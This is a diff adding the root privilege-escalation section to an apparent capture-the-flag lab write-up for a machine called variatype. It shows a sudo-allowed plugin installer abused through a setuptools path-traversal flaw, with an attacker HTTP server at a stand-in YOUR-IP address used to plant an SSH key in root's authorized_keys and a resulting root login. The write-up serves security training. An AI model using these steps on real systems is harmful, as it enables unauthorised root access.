@@ -101,4 +101,68 @@ steve@variatype:~$ id
 uid=1000(steve) gid=1000(steve) groups=1000(steve)
 steve@variatype:~$ 
 ```
-TO BE CONTINUED...
+## ROOT
+First let's check what are we allowed to run as `root`  
+```bash
+steve@variatype:~$ sudo -l
+Matching Defaults entries for steve on variatype:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User steve may run the following commands on variatype:
+    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
+steve@variatype:~$
+```
+We take a look at the scipt at `/opt/font-tools/install_validator.py`.  
+It's used to download and install plugins, so to get root we have to create a malicious `plugin`.  
+Further enumeration reveals that the script uses `setuptools` vulnerable to [CVE-2025-47273](https://github.com/advisories/GHSA-5rjg-fvgr-3xxf)  
+### Exploitation
+Firstly generate an `ssh key` locally  
+```bash
+ssh-keygen -t ed25519 -f /tmp/rootkey -N ""
+cp /tmp/rootkey.pub authorized_keys
+```
+Then create a `server.py`  
+```bash
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class ExploitHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        with open("authorized_keys", "rb") as f:
+            data = f.read()
+
+        self.send_response(200)
+        self.send_header("Content-Type", "application/octet-stream")
+        self.send_header("Content-Length", str(len(data)))
+        self.end_headers()
+        self.wfile.write(data)
+
+server = HTTPServer(("0.0.0.0", 8888), ExploitHandler)
+server.serve_forever()
+```
+Next run the `server.py`  
+```bash
+python3 server.py
+```
+And let's execute:  
+On target  
+```bash
+steve@variatype:~$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
+sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
+> http://YOUR-IP:8888/%2Froot%2F.ssh%2Fauthorized_keys
+```
+Now we can simply use our `/tmp/rootkey` to `ssh` as `root`
+```bash
+ssh -i /tmp/rootkey root@10.129.11.101
+Linux variatype 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Mar 20 11:28:26 2026 from 10.10.14.50
+root@variatype:~# 
+```
